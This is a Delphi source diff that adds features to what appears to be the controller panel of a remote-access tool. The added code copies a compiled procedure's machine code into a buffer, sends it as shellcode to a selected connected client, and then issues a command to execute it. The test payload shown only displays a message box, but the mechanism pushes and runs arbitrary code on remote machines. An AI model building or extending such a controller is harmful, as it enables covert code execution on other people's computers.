@@ -5,7 +5,7 @@ interface
 uses
   Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
   Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ExtCtrls, Vcl.ComCtrls,
-  System.Win.ScktComp, untClientObject, untCommands;
+  System.Win.ScktComp, untClientObject, untCommands, untUtils;
 
 type
   TForm1 = class(TForm)
@@ -13,6 +13,8 @@ type
     Panel1: TPanel;
     Button1: TButton;
     ServerSocket1: TServerSocket;
+    Button2: TButton;
+    Button3: TButton;
     procedure ServerSocket1ClientConnect(Sender: TObject;
       Socket: TCustomWinSocket);
     procedure Button1Click(Sender: TObject);
@@ -24,6 +26,8 @@ type
     procedure ServerSocket1ClientRead(Sender: TObject;
       Socket: TCustomWinSocket);
     procedure ServerSocket1Listen(Sender: TObject; Socket: TCustomWinSocket);
+    procedure Button2Click(Sender: TObject);
+    procedure Button3Click(Sender: TObject);
   private
     { Private-Deklarationen }
   public
@@ -37,9 +41,61 @@ implementation
 
 {$R *.dfm}
 
+procedure lol(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);
+begin
+  pConn.pAPI.xMessageBoxW(0, pData, nil,0);
+end;
+procedure lol_end();begin end;
+
 procedure TForm1.Button1Click(Sender: TObject);
 begin
   ServerSocket1.Active := True;
+end;
+
+procedure TForm1.Button2Click(Sender: TObject);
+var
+  tempThread:TClientThread;
+  dwProcLen:Cardinal;
+  pShell:PShellCode;
+begin
+  if listview1.Selected <> nil then
+  begin
+    tempThread := TClientThread(listview1.Selected.SubItems.Objects[0]);
+    dwProcLen := DWORD(@lol_end) - DWORD(@lol);
+    GetMem(pShell, dwProcLen + SizeOf(TShellCode));
+    if pShell <> nil then
+    begin
+      pShell.dwLen := dwProcLen;
+      pShell.dwID := 1;
+      CopyMemory(Pointer(DWORD(pShell) + SizeOf(TShellCode) - SizeOf(Pointer)), @lol, pShell.dwLen);
+      tempThread.SendBuffer(CMD_SHELLCODE_NEW,pShell,dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
+      FreeMem(pShell);
+    end;
+  end;
+end;
+
+procedure TForm1.Button3Click(Sender: TObject);
+var
+  tempThread:TClientThread;
+  dwProcLen:Cardinal;
+  pShell:PShellCode;
+  pe:String;
+begin
+  if listview1.Selected <> nil then
+  begin
+    pe := 'lel';
+    tempThread := TClientThread(listview1.Selected.SubItems.Objects[0]);
+    dwProcLen := (Length(pe)) * 2;
+    GetMem(pShell, dwProcLen + SizeOf(TShellCode));
+    if pShell <> nil then
+    begin
+      pShell.dwLen := dwProcLen;
+      pShell.dwID := 1;
+      CopyMemory(Pointer(DWORD(pShell) + SizeOf(TShellCode) - SizeOf(Pointer)), @pe[1], pShell.dwLen);
+      tempThread.SendBuffer(CMD_SHELLCODE_CALL,pShell,dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
+      FreeMem(pShell);
+    end;
+  end;
 end;
 
 procedure TForm1.ServerSocket1ClientConnect(Sender: TObject;
